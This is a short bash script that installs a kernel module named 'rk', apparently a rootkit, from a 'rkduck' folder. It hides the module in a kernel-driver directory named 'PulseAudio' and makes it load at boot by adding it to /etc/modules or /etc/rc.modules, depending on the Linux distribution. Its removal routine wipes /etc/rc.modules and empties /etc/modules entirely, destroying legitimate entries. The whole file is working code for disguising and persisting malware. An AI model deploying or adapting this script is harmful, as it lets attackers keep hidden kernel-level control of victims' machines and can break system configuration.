#!/bin/bash

module_name="rk"

function install_rk {

    mkdir /lib/modules/`(uname -r)`/kernel/drivers/PulseAudio
    cp /root/Documents/rkduck/rk.ko /lib/modules/`(uname -r)`/kernel/drivers/PulseAudio/
    for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
        do 
            system=${f:5:${#f}-13}
    done

    if [ "$system" == "" ]; then
        exit
    fi

    if [ "$system" == "debian" ] || [ "$system" == "ubuntu" ]
    then
        echo "$module_name" >> /etc/modules
    elif [ "$system" == "redhat" ] || [ "$system" == "centos" ] || [ "$system" == "fedora" ]
    then
        echo "$module_name" >> /etc/rc.modules
        chmod +x /etc/rc.modules
    fi
    depmod
}

function remove_rk {
    rm -rf /lib/modules/`(uname -r)`/kernel/drivers/PulseAudio
    rm -rf /etc/rc.modules
    echo '' > /etc/modules
    depmod
}

case $1 in
    install)
        install_rk
        ;;
    remove)
        remove_rk
        ;;
esac